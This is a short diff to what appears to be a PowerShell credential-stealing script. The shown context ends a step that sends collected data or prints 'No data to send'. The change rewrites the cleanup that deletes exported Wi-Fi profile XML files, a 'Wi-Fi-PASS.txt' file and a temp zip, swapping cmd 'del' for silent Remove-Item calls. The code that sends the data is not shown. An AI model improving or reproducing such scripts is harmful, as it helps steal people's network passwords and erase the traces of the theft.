@@ -9,9 +9,10 @@ if ($fileContent) {
 } else {
     echo 'No data to send'
 }
+
 # Clean up Wi-Fi pass files
-del Wi*.xml /s /f /q
-del Wi-Fi-PASS.txt /s /f /q
+Get-ChildItem -Path "$env:TEMP" -Filter "Wi*.xml" -Force | Remove-Item -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "$env:TEMP\Wi-Fi-PASS.txt" -Force -ErrorAction SilentlyContinue
 
 # Clean up other temporary files
 Remove-Item -Path "$env:TEMP\Test-F0-3.0.zip" -Force -ErrorAction SilentlyContinue
